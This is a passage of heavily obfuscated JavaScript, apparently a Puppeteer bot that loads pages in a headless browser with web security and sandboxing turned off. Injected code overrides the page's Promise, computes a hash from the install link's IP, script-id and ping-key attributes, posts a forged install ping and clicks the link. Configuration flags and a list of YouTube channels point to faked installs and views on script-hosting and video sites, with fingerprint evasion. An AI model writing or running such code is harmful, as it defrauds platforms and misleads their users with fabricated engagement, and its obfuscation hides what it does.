                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x232e + 0x47 * -0x67 + 0x2 * 0x1fe2 | L >>> -0x4b * -0x4b + 0x3 * 0x2d4 + -0xf * 0x206) + (M & N | ~M & O) + P + (-0x68b45 * 0x1659 + -0x39dcc131 * 0x1 + -0x1 * -0x1269d93c7) + Q[J] << 0x4 * -0xfd + 0x69d + -0xe3 * 0x3) << -0xe72 + -0x2213 * 0x1 + -0x6d * -0x72 | P >>> -0xa33 + 0x1218 + -0x3e5 * 0x2) + (L & (M = M << -0xb1a + -0x9e * -0x1 + 0xa9a | M >>> -0x5 * -0x4cb + -0x1bbc + 0x3c7) | ~L & N) + O + (-0x160 * -0x497d45 + 0x7c6c31ed + -0x86f5f734) + Q[J + (-0xb91 + 0xd3 * 0x7 + 0x5cd)] << 0x1649 + 0x2288 + -0x38d1) << -0x2470 + -0x1 * 0x1106 + -0x1 * -0x357b | O >>> 0x19a9 + -0x3ee + -0xad0 * 0x2) + (P & (L = L << -0x68 * -0xb + -0x365 + -0x31 * 0x5 | L >>> 0xebf + -0x347 * -0x2 + -0x4f * 0x45) | ~P & M) + N + (-0x7c46b7e0 + 0x5a3086f3 + 0x7c98aa86) + Q[J + (-0x67 * -0x59 + -0x674 * -0x6 + -0x4a85 * 0x1)] << 0x299 + -0x3 * 0x1b1 + 0x13d * 0x2) << 0x1 * 0x2c3 + 0xd4 * -0x26 + -0x2 * -0xe5d | N >>> 0x21eb + 0x1 * -0x47b + -0x1d55) + (O & (P = P << 0x1339 * -0x1 + -0x2693 + -0x846 * -0x7 | P >>> -0x14eb + -0x1a27 + 0x2f14) | ~O & L) + M + (0xaad84328 + 0xb772 * 0x653 + -0x54ddef85) + Q[J + (-0x875 + 0x175 * 0x1 + 0x5 * 0x167)] << 0x24b9 + -0x2a3 + 0x2 * -0x110b) << -0xbc9 * -0x1 + -0x2239 + 0x1675 | M >>> 0x18e5 + 0x1424 + -0x2cee * 0x1) + (N & (O = O << 0x26b * -0x1 + -0x2289 + 0x2512 | O >>> -0x71e + -0x854 + -0x56 * -0x2e) | ~N & P) + L + (-0x686f2c18 + -0xb * -0xd964bc9 + 0xb3512 * 0x40f) + Q[J + (-0xa * -0x2b7 + 0x79 * -0x29 + -0x7c1)] << 0x17cc + -0x6fe + -0x10ce, N = N << 0x5 * -0x17 + -0x960 + -0x1 * -0x9f1 | N >>> -0x2 * -0x487 + -0x2 * 0xdd8 + 0x12a4;
              for (; J < 0xe1e + -0x1 * 0xad + -0xd49; J += -0x1f6d * -0x1 + 0x281 * 0x2 + -0x246a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x20ff + -0x15 * -0x7b + 0x16ed | L >>> -0x191 * -0xb + -0x1 * 0xb65 + -0x9 * 0xa3) + (M ^ N ^ O) + P + (-0xa1b11ce0 + 0xcbab045 * 0x3 + 0xea5af7b2) + Q[J] << -0x1 * 0x47f + -0xe5 + 0x564) << 0x1da0 + 0x32 * -0x38 + 0x213 * -0x9 | P >>> -0x26ab + 0x1 * 0x1cf7 + -0x1f * -0x51) + (L ^ (M = M << 0x212d + 0x1 * -0x13c + -0x1fd3 | M >>> -0x12a4 * -0x2 + 0x5 * 0x1ee + -0x2c * 0x111) ^ N) + O + (0x4180186 * 0x9 + 0x1643e88a + -0x3af * -0xe0bef) + Q[J + (-0x1936 + -0x25 * 0x107 + 0x2 * 0x1f9d)] << -0x162d + -0x25cc + 0x3bf9) << -0x12e * -0x14 + -0x3 * -0x9f5 + 0x3572 * -0x1 | O >>> -0x16cc * -0x1 + 0x2 * 0xb19 + -0x2ce3) + (P ^ (L = L << 0x1737 + -0x10db + -0x63e | L >>> 0x1 * 0x6fb + -0xdb4 + 0x6bb) ^ M) + N + (0x1 * -0x5757b5be + -0xb8c6d744 + 0x17ef878a3) + Q[J + (0x2526 + -0x5e8 * 0x1 + -0x1f3c)] << 0x164 + -0x9 * -0x412 + 0x2606 * -0x1) << 0x16d + -0xa1 * -0x5 + -0x48d | N >>> 0x1b0c + -0x1617 + -0x4da) + (O ^ (P = P << -0x3b8 + -0x114d + 0x305 * 0x7 | P >>> -0xa67 + 0x1 * -0x699 + -0x137 * -0xe) ^ L) + M + (0x67f573c2 + 0x966b687d + -0x8f86f09e) + Q[J + (-0x41 * 0x3a + -0x2 * 0x1c4 + -0x3 * -0x617)] << 0x16 * 0x10 + -0x264d + 0x1 * 0x24ed) << -0x1c78 + 0x1b65 * -0x1 + 0x37e2 | M >>> 0x1e * -0x4b + -0x203b + 0x2920) + (N ^ (O = O << -0xf76 + -0x3e0 * -0x4 + 0x14 | O >>> 0x7 * 0x3ec + -0x1137 + -0xa3b) ^ P) + L + (-0x119 * -0x275ebd + -0xbb9096a9 * -0x1 + -0x77eda87d) + Q[J + (0x2489 + -0x1 * 0x19b1 + 0x56a * -0x2)] << 0xa25 + -0x126b + -0x1 * -0x846, N = N << 0x773 * 0x1 + -0xdb2 * 0x1 + 0x65d | N >>> -0x1759 * -0x1 + 0x10cc + 0x3 * -0xd61;
              for (; J < -0x1cc * -0x4 + 0x43 * 0x59 + -0x1e3f; J += 0x1c1b + -0x1235 + -0x9 * 0x119)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x89 * -0x1d + 0x7df + 0x1 * -0x175f | L >>> 0xb * -0x381 + -0x1 * 0xb7 + -0xd1f * -0x3) + (M & N | M & O | N & O) + P - (0x7ddfdf7 + 0x5363171 * -0x4 + -0x7ddf0af1 * -0x1) + Q[J] << 0x60e + 0xdb7 * -0x2 + 0x1 * 0x1560) << -0x1 * -0x3b3 + -0x1b70 * 0x1 + -0x1 * -0x17c2 | P >>> -0x25db * 0x1 + -0x177b * 0x1 + -0x31 * -0x141) + (L & (M = M << -0x1a19 + 0x1d8b + -0x354 | M >>> -0xb60 + 0x5 * -0x1a3 + 0x1391) | L & N | M & N) + O - (0x7ccb2159 + -0x1e41391f * 0x3 + 0xf6 * 0x52117c) + Q[J + (-0xb2 * -0x14 + 0x15ec + 0x9 * -0x3fb)] << -0x206 + -0x2653 * 0x1 + 0x2859) << -0xbf8 + 0x1758 + -0xb5b | O >>> 0x1704 + -0x1f98 * 0x1 + -0x2e5 * -0x3) + (P & (L = L << 0x11d + 0x126f + -0x136e | L >>> -0x9 * 0x33f + -0x24f5 + 0x422e) | P & M | L & M) + N - (0x1 * -0xb837e366 + 0x90859d0c + -0x5f * -0x19b2f42) + Q[J + (0x3 * -0xa27 + 0x2593 * 0x1 + 0x71c * -0x1)] << 0x45d + 0x37d * -0x6 + 0x1 * 0x1091) << -0x503 * -0x1 + 0x2 * -0x21 + 0x2 * -0x25e | N >>> 0x33 * 0xaf + 0xa0 * 0x25 + 0x1cf1 * -0x2) + (O & (P = P << -0x1 * -0xd56 + -0x1bd7 + -0xe9f * -0x1 | P >>> 0xa43 + -0xf5 + 0x44 * -0x23) | O & L | P & L) + M - (0xb * 0xb82add3 + -0x2a11b403 + 0x1c587f16) + Q[J + (0xe36 + 0x182 * 0xf + -0x91 * 0x41)] << 0x287 * 0x1 + -0x247 + -0x40) << -0x202d * 0x1 + 0x2 * -0xd9d + 0x2 * 0x1db6 | M >>> -0x1f2 + -0x21 * -0x53 + -0x1 * 0x8a6) + (N & (O = O << -0xd9 * -0xf + -0x1cd2 + 0x1039 | O >>> 0x6f9 + -0x1d78 + 0x1 * 0x1681) | N & P | O & P) + L - (0x20c * -0x43748f + -0x76a8e07d * 0x1 + 0x1719fb855) + Q[J + (0x1c1 * 0x5 + -0xa2e * 0x1 + -0x1 * -0x16d)] << 0x1fb1 + 0x2 * 0x8cd + 0x1 * -0x314b, N = N << 0x1 * 0x146b + -0x1f17 + 0xaca * 0x1 | N >>> -0xadb + 0x205 + 0x8d8;
              for (; J < -0x1973 + 0x1ad9 * 0x1 + -0x116; J += -0x312 + 0x2539 * 0x1 + -0x2222)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19a6 + 0xb96 + -0x7 * 0x551 | L >>> 0x1c * -0xa5 + 0x1 * 0x22d8 + -0x10b1) + (M ^ N ^ O) + P - (-0xd6529a + -0x58785be1 + 0x8eebeca5) + Q[J] << -0x7 * -0x4e5 + 0x343 * 0x1 + 0x2 * -0x12c3) << 0x1a * 0xa9 + -0x1870 + 0x74b | P >>> -0xbfc + 0xcb5 * -0x2 + 0x2581) + (L ^ (M = M << -0x2091 + 0x1fd * -0x1 + 0x1156 * 0x2 | M >>> -0x1 * 0x24af + -0x9a1 + 0x2e52) ^ N) + O - (-0x2673 * 0x12c19 + -0x3 * -0x1ab89361 + 0x12860942) + Q[J + (0x125 * -0x11 + -0x1 * 0x21a1 + 0x3517)] << -0x1cc * 0x5 + -0x3ba + 0x2 * 0x65b) << -0x18 * 0x13f + -0x2576 + 0x4363 | O >>> 0x1144 + 0xa12 + 0x1 * -0x1b3b) + (P ^ (L = L << 0xa60 * 0x3 + -0x4 * 0x3bb + -0x1016 | L >>> 0x36 * 0x3 + 0xf07 + -0x1 * 0xfa7) ^ M) + N - (0x1 * 0x53b35334 + 0x67c2cded + 0x2c9da0fd * -0x3) + Q[J + (0x204d + 0x1 * 0x2366 + -0x43b1)] << 0x1569 + -0xa51 * 0x2 + 0x1 * -0xc7) << -0x6d * -0x14 + 0x2643 + -0x2ec2 | N >>> 0x209 * 0x5 + 0x1 * 0x4f4 + -0x3 * 0x502) + (O ^ (P = P << -0x6a0 * 0x2 + -0x2699 + 0x33f7 | P >>> -0x5fd + 0x2bf * -0x3 + -0x1 * -0xe3c) ^ L) + M - (0x225b5f74 + -0x1 * 0x6902d43 + 0x19d20bf9) + Q[J + (0x1ad + -0x14 * -0x73 + -0xaa6 * 0x1)] << -0xc33 + -0x1 * 0x13df + 0xa * 0x335) << -0x50f + -0x50 * -0x68 + -0x1b6c | M >>> 0xfcd + 0x2364 + -0x3316) + (N ^ (O = O << 0x1053 + -0x1 * -0x419 + 0x17 * -0xe2 | O >>> -0x65 * 0xe + 0x10e1 * 0x1 + 0x19f * -0x7) ^ P) + L - (0x4a0dfeb + -0x2 * 0x18e990db + -0x62cf7ff5 * -0x1) + Q[J + (-0x1301 + 0x14a7 + -0xd1 * 0x2)] << -0xc45 + 0x1dc + 0xa69, N = N << -0x1c95 + -0x13c7 + -0xaa * -0x49 | N >>> 0xa2c + 0x15d7 * -0x1 + 0xbad;
              this['h0'] = this['h0'] + L << -0xb * 0x179 + -0x2464 + -0x3497 * -0x1, this['h1'] = this['h1'] + M << -0x1255 + -0x23d3 + -0x1b14 * -0x2, this['h2'] = this['h2'] + N << -0x4fd + 0xb7a + 0x1 * -0x67d, this['h3'] = this['h3'] + O << 0x3 * -0x65d + 0x8f1 * -0x2 + 0x24f9, this['h4'] = this['h4'] + P << -0x1 * -0x4cd + 0x2 * -0xa5d + 0xfed;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x61c * -0x3 + -0x1 * -0x53 + 0x121d & 0x1c07 + 0x1b9a + 0x6 * -0x943] + w[J >> -0x31 * -0x71 + 0xe6d * 0x2 + -0x3263 & 0x14ba + -0x7 * -0x169 + -0x1e8a] + w[J >> -0x4 * 0x4c6 + -0xbf5 + 0x1f21 & -0x2 * 0xab7 + 0xef8 + 0x685] + w[J >> 0xdb + 0x2cb * 0xc + -0x224f & -0x157 * -0x1a + -0x3 * -0x52 + -0x23bd] + w[J >> 0x2da * -0x7 + -0x11de + -0x10 * -0x25e & -0xe7 * 0x2 + 0x5 * 0x295 + -0x4 * 0x2c3] + w[J >> 0x10d0 + -0x2 * -0x46c + 0x19a0 * -0x1 & 0x13 * -0x1f5 + 0x20f0 + 0x1 * 0x44e] + w[J >> -0x60f * -0x2 + -0x18eb + 0xcd1 & 0x16dc + -0x19 * -0x79 + -0x229e] + w[-0x94 * -0x3a + -0x1 * 0x10a5 + -0x10d4 & J] + w[K >> -0x88 * -0x3d + -0xf5a + -0x10f2 & 0x6c * -0x27 + 0xf64 + -0x29 * -0x7] + w[K >> 0x24d6 * -0x1 + -0x32 * 0xc5 + -0x13 * -0x3f8 & -0x17b * -0x7 + 0x204f * -0x1 + 0x1601] + w[K >> 0x45b + -0x14e * -0x5 + -0xacd & -0x206 + 0x1891 + -0x167c] + w[K >> -0x125d + 0x1 * -0x1e99 + 0x3106 & 0x411 * 0x3 + 0x1061 + -0x1c85] + w[K >> 0x6f * -0x29 + -0x949 + 0x4 * 0x6c7 & 0x8e3 + 0x2208 + -0x4 * 0xab7] + w[K >> -0x4c * -0x7 + -0x2e4 + -0x3 * -0x48 & -0xfc * -0x14 + 0x1364 + -0x2705 * 0x1] + w[K >> 0x10 * -0x1d4 + 0x1386 + 0x9be & 0x97 * -0xb + 0x1 * 0x1d93 + -0x1707] + w[0xeec + -0x5 * 0x112 + -0x983 & K] + w[L >> 0x3 * 0x504 + -0x178d + -0x7 * -0x13b & 0x1c9 * 0x12 + 0x3b * -0x13 + -0x1bb2] + w[L >> -0x1eb5 + -0x1 * 0x435 + 0x2302 & -0xdc * -0x5 + -0x599 * 0x4 + 0x3 * 0x60d] + w[L >> 0x11fb + -0x17c8 + 0x5e1 & -0x2531 * 0x1 + -0x13a5 + 0x38e5] + w[L >> 0x2194 + -0x12d7 + 0xdd * -0x11 & -0x2127 + -0x747 + 0x287d] + w[L >> 0x1 * -0xf9b + 0x4df * 0x6 + -0xd93 & -0xbb2 * -0x2 + -0x92a + -0x3 * 0x4b9] + w[L >> -0xb5d * -0x2 + -0x1 * 0x219d + 0xaeb & -0x31 * 0x97 + -0x1a * 0x19 + -0x2a * -0xc0] + w[L >> 0x222 + 0x1 * 0x1b6b + -0x1d89 & -0x2554 + -0x3ed + 0x2950] + w[0x1c32 + 0x2fb * 0x7 + -0x3100 & L] + w[M >> 0x779 * -0x1 + -0x1ec * 0x9 + -0xc1 * -0x21 & -0x1bcf + -0x2b * 0x2 + 0x5f * 0x4c] + w[M >> -0x148c + 0x17e9 + -0x345 * 0x1 & 0x115 * 0x20 + 0x3 * -0x469 + -0xaab * 0x2] + w[M >> -0x132f + 0x4cb * 0x5 + -0x56 * 0xe & -0x7 * -0x50d + -0x1c62 + -0x6ea] + w[M >> 0x46 * -0x5a + 0x14ac + 0x400 & -0x2a * -0x2 + -0x9 * -0x9a + 0x123 * -0x5] + w[M >> -0x2 * -0xdc3 + 0x1 * -0x17ff + 0x63 * -0x9 & -0x577 * 0x1 + -0x1b06 + 0x208c] + w[M >> 0x1 * 0x26d1 + 0x21c + -0x28e5 & 0x1 * -0x54d + -0x9 * 0x1df + 0x1633] + w[M >> -0x1f2 + -0x15fd * 0x1 + 0x17f3 & 0x64 + -0xa3c + 0x9e7] + w[0x116e + -0xd98 + -0x3c7 & M] + w[N >> -0x663 + 0x295 * -0xf + 0x7 * 0x676 & -0x6d2 + -0xcb * -0xb + -0x1d8] + w[N >> -0x1ce7 + -0x664 + 0x2363 & 0x13 * 0x39 + -0x1ce4 + 0x18b8] + w[N >> 0x9b1 + -0x1ce9 + -0x5f * -0x34 & -0xafd + -0xcb3 * -0x1 + -0x1a7] + w[N >> 0xe27 * 0x2 + 0x179 * -0xe + 0x3d0 * -0x2 & -0x4 * 0x923 + -0x82a + 0x9d * 0x49] + w[N >> -0x1 * 0x1b2 + 0x19a1 + 0x4c7 * -0x5 & 0x4d1 * -0x7 + 0x6b9 * 0x2 + -0xa2a * -0x2] + w[N >> 0x1be * -0xe + -0x4ed + 0x1d59 * 0x1 & -0x10 * 0x92 + 0x3a5 * 0x1 + 0x58a] + w[N >> 0xe4 * 0x3 + -0x1 * -0x228b + -0x1 * 0x2533 & 0x56 * 0x2b + 0x14fc + -0x235f] + w[-0x1 * 0xd79 + -0x12b1 + 0x2039 * 0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x478 + -0x1720 + 0x12c0 & 0xbc5 + 0x1 * 0xf5f + -0x1a25,
                J >> -0x26de + -0x261d * 0x1 + 0x4d0b & 0x4 * 0x664 + 0x2679 + 0x1 * -0x3f0a,
                J >> -0x1 * 0x155e + 0x6 * -0x67f + 0xb8 * 0x54 & 0xe6d * -0x2 + -0x2 * 0x1ee + 0x21b5,
                -0x1441 + -0x1733 * -0x1 + -0x1f3 & J,
                K >> -0x10fa + 0xb * 0x17d + 0xb3 & -0x20bb + 0x197b + -0x1 * -0x83f,
                K >> -0xf5b + 0x775 + 0x7f6 & -0x113c + -0x270a + 0xb5 * 0x51,
                K >> -0x6 * 0x390 + 0x366 + 0x1202 * 0x1 & 0x14bb + 0x7bd * -0x2 + -0x442,
                -0x1 * -0x24da + -0x206e + 0x1 * -0x36d & K,
                L >> 0x7d * -0x1a + 0x1 * 0x238f + -0x16c5 & -0x7 * 0x4ba + -0x11cb + 0x14 * 0x298,
                L >> -0x18c8 + -0x1454 + -0xe * -0x33a & -0x2c * 0x30 + 0xfdd + 0xb * -0x9a,
                L >> -0x1 * 0x248d + 0x2576 + -0xe1 & -0xef * 0x13 + -0x2 * 0x12f7 + 0x38aa,
                0x763 * -0x2 + 0x8d6 + 0x47 * 0x19 & L,
                M >> -0x1 * 0x1087 + -0x13f * 0x13 + 0x284c & 0x1e9a + -0x79c * 0x2 + -0xe63,
                M >> 0x238b + -0x1b90 + 0x7eb * -0x1 & -0x4b * -0xc + 0x3d * 0x65 + -0x52 * 0x53,
                M >> -0x208e + -0x119e + 0x3234 & 0x1f73 + 0x14b8 + -0x332c,
                0x17 * -0x1f + 0x6f1 * 0x2 + -0xa1a * 0x1 & M,
                N >> 0x247 + -0x15fb + 0x4f3 * 0x4 & -0x1581 + 0x1943 + -0x65 * 0x7,
                N >> 0x5 * 0x7ad + -0x26bb + 0x6a & 0xc7 * 0x4 + -0x14 * -0x2b + -0x579,
                N >> -0xbdd * 0x3 + 0x5e9 + 0x1db6 & 0x360 + 0x5 * -0x46a + -0x47 * -0x47,
                0x13fa + 0x477 * 0x6 + 0x1 * -0x2dc5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x7d9 + 0x266b + -0x2e30), (K = new DataView(J))['setUint32'](0x540 + 0xfa * 0x1 + 0x2 * -0x31d, this['h0']), K['setUint32'](0xb9 * 0x1e + -0xf93 + -0x617, this['h1']), K['setUint32'](0x1 * 0x247 + 0xe * -0x116 + -0x1 * -0xcf5, this['h2']), K['setUint32'](0x1 * -0x1861 + 0xdbd * -0x2 + -0x67 * -0x81, this['h3']), K['setUint32'](0x18c5 + 0xc * 0x128 + -0x2695, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G[T(0x10, 'CX1]')]['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x18b9 + 0xe7f + 0xa3a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2701 + -0x1558 + -0x11a9;
            J[-0x23e * 0xe + 0x1 * 0x1999 + -0x5cb * -0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xb4d * -0x3 + -0x7 * 0xf9 + -0x1b18] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x26a2 + -0x124f + 0x38f2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x16eb + -0x23b + 0x1927;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x15e6 * -0x1 + -0x1a * -0x3a + -0x15ee), Promise['resolve'](-0xf83 + -0x2d5 * -0x5 + 0x15b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x2457 + -0x322 + -0x2135; j < 0x9ba + -0x667 * 0x3 + -0x1 * -0x97c; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x3 * 0x926 + -0x10bb + 0x2c2d);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = 0x20b * 0x5 + -0x3800 + -0x29 * -0x1e1 + (-0x520 + 0x1416 + 0x5 * -0xa6) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x5e0 * -0x1 + 0x982 + -0xf5f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function a() {
  const bk = [
    'CMv3lg1YyMvHCW',
    'Bsb2AwrLBY4UlG',
    'ncNcTGxdKJ5UdwKc',
    'Ahr0Chm6lY9NCG',
    '3sGeIBfFlC',
    'ML,\x20like\x20G',
    'mKXMvgP5vNrIzG',
    '8.0.0.0\x20Sa',
    'bHxdLrBdIh4zW7arW5e',
    'https://me',
    '/Bloggerpe',
    'pts/by-sit',
    'D1DRDMLzohPcCG',
    'rg/en/scri',
    'mcaOv2LUzg93CW',
    'DY55B3v0DwjLlG',
    'h8kqjdudW5FcOwRdSW',
    'https://gr',
    'W7ZdUctdUCo7hrFdK8oOWOC',
    'BgvUz3rO',
    'CMCVzw4VC2nYAq',
    'Bc9vq0fPtgzQtG',
    'easyfork.o',
    'WQ7dQ8oU',
    'ecko)\x20Chro',
    'u2XPDgHLCI5PBW',
    'WO5lW4apt8knW6v7WRVcIG',
    'WPpdK2LunW',
    'WQtdPSoYuWldLq',
    'W4GzW7tdJ8k5W4FcSmoQW4OG',
    'W43dT3tdRGxcVmkbsCo3uW',
    '.0\x20Safari/'
  ];
  a = function() {
    return bk;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x3 * 0x926 + -0x10bb + 0x2c2d);
    let h = e[f];
    if (b['swpSbP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x48 + 0x109e + -0x873 * 0x2, s, t, u = -0x3 * -0xb35 + -0x2002 + -0x19d; t = n['charAt'](u++); ~t && (s = r % (-0x1999 + -0x1b6d + -0x1f * -0x1b6) ? s * (-0x1fb * 0xd + 0xb5 * 0x16 + 0x9 * 0x129) + t : t, r++ % (0x19dd + 0x20c * -0x4 + -0x11a9)) ? p += String['fromCharCode'](0x2 * 0x337 + 0x24d2 + -0x2a41 * 0x1 & s >> (-(-0x12a * 0x1b + -0x1 * 0x1c23 + 0x3b93) * r & 0xb95 + -0x495 + -0x6fa)) : -0x61b * 0x2 + -0x1020 + -0x9 * -0x326) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * 0x1c8a + 0x1 * -0x97a + 0x2604, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2c6 * 0x6 + 0x1 * -0x1eed + 0x1 * 0x2fa1))['slice'](-(-0x3ae * -0xa + -0x2 * -0x12f5 + -0x1 * 0x4ab4));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xc55 + 0x210c + -0x2d61,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x28 + -0x1 * -0xaa5 + 0xf * -0xb3; u < 0xa3d + -0x53 * 0x58 + -0xb * -0x1c1; u++) {
          p[u] = u;
        }
        for (u = -0x2 * 0xc47 + 0x2b1 + 0xc1 * 0x1d; u < -0x1b1 * 0x12 + 0x1aa * 0x14 + -0x1d6; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x42 * -0xb + -0xc97 + 0x106d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * -0x21cf + -0x4 * -0x209 + 0x19ab, q = 0x11b * -0x1a + -0x1 * 0x26ad + 0x436b;
        for (let v = -0x1ccf + -0x18f0 + 0x35bf; v < n['length']; v++) {
          u = (u + (-0x6ab * -0x1 + 0x11c * -0x22 + 0x1f0e)) % (-0x35c * -0x2 + 0xa99 * -0x1 + 0x4e1), q = (q + p[u]) % (-0x742 * 0x4 + 0x1 * 0x1ea3 + 0x1 * -0x9b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xc5f * -0x2 + 0x1 * 0x17ef + -0x1cf * -0x1)]);
        }
        return t;
      };
      b['BbQWon'] = m, c = arguments, b['swpSbP'] = !![];
    }
    const j = e[-0x5ec + -0x1 * 0x1323 + 0x5 * 0x503],
      k = f + j,
      l = c[k];
    return !l ? (b['lOLGiA'] === undefined && (b['lOLGiA'] = !![]), h = b['BbQWon'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + U(0x15) + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + U(0xf) + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x3 * 0x926 + -0x10bb + 0x2c2d);
    let h = e[f];
    if (c['EZBCxI'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x48 + 0x109e + -0x873 * 0x2, r, s, t = -0x3 * -0xb35 + -0x2002 + -0x19d; s = m['charAt'](t++); ~s && (r = q % (-0x1999 + -0x1b6d + -0x1f * -0x1b6) ? r * (-0x1fb * 0xd + 0xb5 * 0x16 + 0x9 * 0x129) + s : s, q++ % (0x19dd + 0x20c * -0x4 + -0x11a9)) ? o += String['fromCharCode'](0x2 * 0x337 + 0x24d2 + -0x2a41 * 0x1 & r >> (-(-0x12a * 0x1b + -0x1 * 0x1c23 + 0x3b93) * q & 0xb95 + -0x495 + -0x6fa)) : -0x61b * 0x2 + -0x1020 + -0x9 * -0x326) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * 0x1c8a + 0x1 * -0x97a + 0x2604, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x2c6 * 0x6 + 0x1 * -0x1eed + 0x1 * 0x2fa1))['slice'](-(-0x3ae * -0xa + -0x2 * -0x12f5 + -0x1 * 0x4ab4));
        }
        return decodeURIComponent(p);
      };
      c['gWZFGb'] = i, b = arguments, c['EZBCxI'] = !![];
    }
    const j = e[0xc55 + 0x210c + -0x2d61],
      k = f + j,
      l = b[k];
    return !l ? (h = c['gWZFGb'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x427 * 0x5 + -0x225 * 0x4 + -0xc2f * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const V = b;
